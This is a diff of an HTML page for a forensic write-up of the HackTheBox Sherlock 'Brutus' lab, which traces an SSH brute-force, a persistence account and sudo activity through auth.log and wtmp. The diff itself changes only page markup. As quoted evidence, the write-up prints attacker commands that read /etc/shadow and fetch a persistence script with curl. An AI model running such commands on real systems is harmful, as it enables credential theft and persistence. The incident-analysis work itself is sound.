@@ -4,14 +4,16 @@
   <title>HTB Sherlock: Brutus — Nguyen Thai Ngoc</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Cybersecurity investigation and hands-on lab writeup by Nguyen Thai Ngoc.">
+  <link rel="canonical" href="https://tngoc1810.github.io/writeups/htb/brutus/">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/assets/css/style.css">
-  <link rel="stylesheet" href="/assets/css/premium.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=20260930b">
+  <link rel="stylesheet" href="/assets/css/premium.css?v=20260930b">
 </head>
 <body>
-  <header class="topbar"><div class="wrap topbar-inner"><a class="brand" href="/">ThaiNgoc :~$</a><nav class="nav"><a href="/">Home</a><a class="active" href="/writeups/">Writeups</a><a href="/projects/">Projects</a><a href="/achievements/">Achievements</a><a href="/contact/">Contact</a></nav></div></header>
+  <header class="topbar"><div class="wrap topbar-inner"><a class="brand" href="/">ThaiNgoc :~$</a><nav class="nav"><a href="/">Home</a><a class="active" href="/writeups/">Writeups</a><a href="/achievements/">Achievements</a><a href="/contact/">Contact</a></nav></div></header>
   <main class="page htb-brutus-page"><div class="wrap article-layout">
     <aside class="toc"><div class="toc-title">On this page</div><a href="#overview">Overview</a><a href="#artifacts">Artifacts</a><a href="#methodology">Methodology</a><a href="#accepted">Successful Logins</a><a href="#failed">Brute-force Evidence</a><a href="#enrichment">IP Enrichment</a><a href="#wtmp">wtmp Sessions</a><a href="#persistence">Persistence</a><a href="#commands">Sudo Evidence</a><a href="#timeline">Timeline</a><a href="#answers">Task Answers</a><a href="#lessons">Lessons</a></aside>
     <article class="article-card glass">
@@ -27,7 +29,7 @@
 
       <h2 id="artifacts">Artifacts and First Look</h2>
       <p>After extracting the challenge archive, I had three useful files: <code>auth.log</code>, <code>wtmp</code> and <code>utmp.py</code>. I started with <code>auth.log</code> because it is plain text and usually gives the fastest view of SSH activity.</p>
-      <figure class="evidence-shot"><figcaption><span>Evidence 01</span><span>Initial artifact review</span></figcaption><img src="/assets/media/writeups/htb-brutus/01-initial-authlog-inspection.png" alt="Initial auth.log inspection showing auth.log utmp.py and wtmp files"></figure>
+      <figure class="evidence-shot"><figcaption><span>Evidence 01</span><span>Initial artifact review</span></figcaption><img loading="lazy" decoding="async" src="/assets/media/writeups/htb-brutus/01-initial-authlog-inspection.png" alt="Initial auth.log inspection showing auth.log utmp.py and wtmp files"></figure>
       <p>The beginning of the log contained many CRON/PAM entries for the <code>confluence</code> user. I treated those as background noise until they connected to SSH activity. For this lab, the useful pivots were <code>sshd</code>, <code>Failed password</code>, <code>Accepted password</code>, <code>useradd</code>, <code>groupadd</code>, <code>usermod</code> and <code>sudo</code>.</p>
 
       <h2 id="methodology">Methodology</h2>
@@ -37,7 +39,7 @@
 
       <h2 id="accepted">Successful SSH Logins</h2>
       <p>The first useful pivot was filtering accepted SSH logins. The output showed two source IPs, but <code>65.2.161.68</code> stood out because it logged in as <code>root</code> multiple times and later as <code>cyberjunkie</code>.</p>
-      <figure class="evidence-shot"><figcaption><span>Evidence 02</span><span>Accepted SSH password logins</span></figcaption><img src="/assets/media/writeups/htb-brutus/02-accepted-ssh-logins.png" alt="Accepted SSH password logins for root and cyberjunkie"></figure>
+      <figure class="evidence-shot"><figcaption><span>Evidence 02</span><span>Accepted SSH password logins</span></figcaption><img loading="lazy" decoding="async" src="/assets/media/writeups/htb-brutus/02-accepted-ssh-logins.png" alt="Accepted SSH password logins for root and cyberjunkie"></figure>
       <div class="terminal-window"><span class="cmd">$ cat auth.log | grep "Accepted"</span>
 Mar  6 06:19:54 sshd[1465]: <span class="ok">Accepted password</span> for <span class="user">root</span> from 203.101.190.9 port 42825 ssh2
 Mar  6 06:31:40 sshd[2411]: <span class="ok">Accepted password</span> for <span class="user">root</span> from <span class="ip">65.2.161.68</span> port 34782 ssh2
@@ -47,10 +49,10 @@ Mar  6 06:37:34 sshd[2667]: <span class="ok">Accepted password</span> for <span 
 
       <h2 id="failed">Brute-force Evidence</h2>
       <p>Next I searched failed password events. The raw output contained both real local accounts and <code>invalid user</code> attempts. Invalid-user attempts are still suspicious, but for the task I needed to understand which valid accounts were attacked.</p>
-      <figure class="evidence-shot"><figcaption><span>Evidence 03</span><span>Failed password attempts from 65.2.161.68</span></figcaption><img src="/assets/media/writeups/htb-brutus/03-failed-password-attempts.png" alt="Failed password attempts from 65.2.161.68"></figure>
+      <figure class="evidence-shot"><figcaption><span>Evidence 03</span><span>Failed password attempts from 65.2.161.68</span></figcaption><img loading="lazy" decoding="async" src="/assets/media/writeups/htb-brutus/03-failed-password-attempts.png" alt="Failed password attempts from 65.2.161.68"></figure>
       <p>After excluding <code>invalid user</code> lines, the remaining valid-user failures targeted only <code>backup</code> and <code>root</code>.</p>
-      <figure class="evidence-shot"><figcaption><span>Evidence 04</span><span>Failed attempts against valid local users</span></figcaption><img src="/assets/media/writeups/htb-brutus/04-valid-user-failed-logins.png" alt="Failed attempts against backup and root from 65.2.161.68"></figure>
-      <figure class="evidence-shot"><figcaption><span>Evidence 05</span><span>Valid-user attempt counts</span></figcaption><img src="/assets/media/writeups/htb-brutus/05-valid-user-counts.png" alt="Count of failed attempts against backup and root"></figure>
+      <figure class="evidence-shot"><figcaption><span>Evidence 04</span><span>Failed attempts against valid local users</span></figcaption><img loading="lazy" decoding="async" src="/assets/media/writeups/htb-brutus/04-valid-user-failed-logins.png" alt="Failed attempts against backup and root from 65.2.161.68"></figure>
+      <figure class="evidence-shot"><figcaption><span>Evidence 05</span><span>Valid-user attempt counts</span></figcaption><img loading="lazy" decoding="async" src="/assets/media/writeups/htb-brutus/05-valid-user-counts.png" alt="Count of failed attempts against backup and root"></figure>
       <div class="terminal-window"><span class="cmd">$ grep -i "failed password" auth.log | grep -v invalid | cut -d ' ' -f 10 | sort | uniq -c | sort -nr</span>
       9 <span class="user">backup</span>
       6 <span class="user">root</span></div>
@@ -58,23 +60,23 @@ Mar  6 06:37:34 sshd[2667]: <span class="ok">Accepted password</span> for <span 
 
       <h2 id="enrichment">Source IP Enrichment</h2>
       <p>I enriched <code>65.2.161.68</code> with <code>ipinfo.io</code>. It resolved to AWS EC2 in the <code>ap-south-1</code> region. I would not treat that as attribution to the operator. It only tells me the source host was cloud infrastructure.</p>
-      <figure class="evidence-shot"><figcaption><span>Evidence 06</span><span>IP enrichment for 65.2.161.68</span></figcaption><img src="/assets/media/writeups/htb-brutus/06-source-ip-enrichment.png" alt="ipinfo enrichment showing 65.2.161.68 hosted on AWS EC2"></figure>
+      <figure class="evidence-shot"><figcaption><span>Evidence 06</span><span>IP enrichment for 65.2.161.68</span></figcaption><img loading="lazy" decoding="async" src="/assets/media/writeups/htb-brutus/06-source-ip-enrichment.png" alt="ipinfo enrichment showing 65.2.161.68 hosted on AWS EC2"></figure>
       <div class="mini-note"><strong>Analyst note:</strong> I would report this as “source IP hosted on AWS EC2” rather than “attacker is from India,” because cloud region geolocation is not the same as operator attribution.</div>
 
       <h2 id="wtmp">Confirming the Manual Session with wtmp</h2>
       <p>The task asks for the time when the attacker logged in manually and established a terminal session. That timestamp is different from simply seeing <code>Accepted password</code> in <code>auth.log</code>. For this, I parsed the binary <code>wtmp</code> file with <code>utmpdump</code>.</p>
-      <figure class="evidence-shot"><figcaption><span>Evidence 07</span><span>wtmp terminal session analysis</span></figcaption><img src="/assets/media/writeups/htb-brutus/09-wtmp-session-analysis.png" alt="utmpdump wtmp showing root session and cyberjunkie session from 65.2.161.68"></figure>
+      <figure class="evidence-shot"><figcaption><span>Evidence 07</span><span>wtmp terminal session analysis</span></figcaption><img loading="lazy" decoding="async" src="/assets/media/writeups/htb-brutus/09-wtmp-session-analysis.png" alt="utmpdump wtmp showing root session and cyberjunkie session from 65.2.161.68"></figure>
       <p>The key <code>wtmp</code> record showed <code>root</code> on <code>pts/1</code> from <code>65.2.161.68</code> at <code>2024-03-06 06:32:45</code>. A later <code>DEAD_PROCESS</code> record showed the root session ended at <code>06:37:24</code>. Only seconds later, <code>cyberjunkie</code> logged in from the same IP.</p>
       <div class="mindset"><strong>Why wtmp mattered:</strong> <code>auth.log</code> tells me authentication succeeded. <code>wtmp</code> tells me an actual login session existed on a terminal like <code>pts/1</code>. That makes the answer stronger.</div>
 
       <h2 id="persistence">Persistence Through a New Local Account</h2>
       <p>I searched for <code>cyberjunkie</code> across <code>auth.log</code> to understand whether it was an existing account or created during the incident. The log showed the full account creation sequence: group creation, user creation, password change and sudo group membership.</p>
-      <figure class="evidence-shot"><figcaption><span>Evidence 08</span><span>cyberjunkie account creation and sudo membership</span></figcaption><img src="/assets/media/writeups/htb-brutus/08-cyberjunkie-persistence-account.png" alt="auth.log entries showing cyberjunkie user creation and sudo group membership"></figure>
+      <figure class="evidence-shot"><figcaption><span>Evidence 08</span><span>cyberjunkie account creation and sudo membership</span></figcaption><img loading="lazy" decoding="async" src="/assets/media/writeups/htb-brutus/08-cyberjunkie-persistence-account.png" alt="auth.log entries showing cyberjunkie user creation and sudo group membership"></figure>
       <p>This is local-account persistence. The attacker used the compromised <code>root</code> account to create <code>cyberjunkie</code>, assign it a password, give it <code>/bin/bash</code> as a shell, add it to <code>sudo</code>, and then log in through SSH using that account. The MITRE ATT&amp;CK mapping is <code>T1136.001 - Create Account: Local Account</code>.</p>
 
       <h2 id="commands">Sudo Command Evidence</h2>
       <p>The root session and the new account were not the end of the story. Sudo logs showed that <code>cyberjunkie</code> executed privileged commands from <code>/home/cyberjunkie</code> on <code>pts/1</code>.</p>
-      <figure class="evidence-shot"><figcaption><span>Evidence 09</span><span>Root session, sudo activity and script retrieval</span></figcaption><img src="/assets/media/writeups/htb-brutus/07-root-session-and-sudo-events.png" alt="auth.log timeline showing root session cyberjunkie sudo commands and curl command"></figure>
+      <figure class="evidence-shot"><figcaption><span>Evidence 09</span><span>Root session, sudo activity and script retrieval</span></figcaption><img loading="lazy" decoding="async" src="/assets/media/writeups/htb-brutus/07-root-session-and-sudo-events.png" alt="auth.log timeline showing root session cyberjunkie sudo commands and curl command"></figure>
       <div class="terminal-window">Mar  6 06:37:57 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=<span class="hit">/usr/bin/cat /etc/shadow</span>
 Mar  6 06:39:38 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=<span class="hit">/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span></div>
       <p>The first command attempted to read <code>/etc/shadow</code>, which is strong credential-access evidence. The second command retrieved a script from GitHub raw content. The full command required by the task was:</p><pre><code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code></pre>
@@ -92,7 +94,7 @@ Mar  6 06:39:38 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=roo
       <div class="callout"><strong>Final conclusion:</strong> the attacker brute-forced SSH from <code>65.2.161.68</code>, compromised <code>root</code>, established a manual session at <code>2024-03-06 06:32:45</code>, created a privileged local account named <code>cyberjunkie</code> for persistence, and used that account to execute privileged commands.</div>
     </article>
   </div></main>
-  <script src="/assets/js/main.js"></script><script>function initCyberBackground(){const prefersReducedMotion=window.matchMedia("(prefers-reduced-motion: reduce)").matches;removeOldBackgrounds();document.body.classList.remove("home-bg-mode");document.body.classList.add("writeups-bg-mode");if(prefersReducedMotion||window.innerWidth<=760)return;initWriteupBackground(false);}</script>
-<script src="/assets/js/premium.js"></script>
+  <script src="/assets/js/main.js?v=20260930b"></script><script>function initCyberBackground(){const prefersReducedMotion=window.matchMedia("(prefers-reduced-motion: reduce)").matches;removeOldBackgrounds();document.body.classList.remove("home-bg-mode");document.body.classList.add("writeups-bg-mode");if(prefersReducedMotion||window.innerWidth<=760)return;initWriteupBackground(false);}</script>
+<script src="/assets/js/premium.js?v=20260930b"></script>
 </body>
 </html>
